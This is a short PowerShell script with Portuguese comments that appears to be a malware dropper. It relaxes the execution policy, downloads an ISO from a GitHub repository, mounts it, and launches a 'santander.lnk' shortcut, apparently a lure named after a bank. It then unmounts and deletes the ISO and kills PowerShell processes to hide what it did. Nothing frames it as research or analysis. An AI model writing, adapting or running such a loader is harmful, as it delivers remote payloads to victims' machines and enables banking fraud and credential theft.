# Escopo do usuario
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

# Diretorio do Usuario
cd "$($env:USERPROFILE)\Downloads\"
$caminho = "$($env:USERPROFILE)\Downloads\"

#Download ISO
New-Item -Type Directory (split-path $caminho) -ErrorAction ignore | Out-Null
Invoke-WebRequest https://github.com/fukkoff184/testup/raw/main/brat.iso -OutFile $caminho\brat.iso
Start-Sleep -s 5

# Montando a ISO
$caminhodoISO = "$caminho" + "brat.iso"
Mount-DiskImage -ImagePath $caminhodoISO -StorageType ISO -Access ReadOnly
$keep = Get-Volume -FileSystemLabel "BRAT"
$driveLetter = ($keep | Get-Volume).DriveLetter
invoke-item "$($driveLetter):\santander.lnk"

# Desmontando e limpando a ISO
Start-Sleep -s 3
Dismount-DiskImage -ImagePath $caminhodoISO | Out-Null
Stop-process -name "powershell" -Force -ErrorAction ignore

# Remover ISO
Remove-Item .\brat.iso
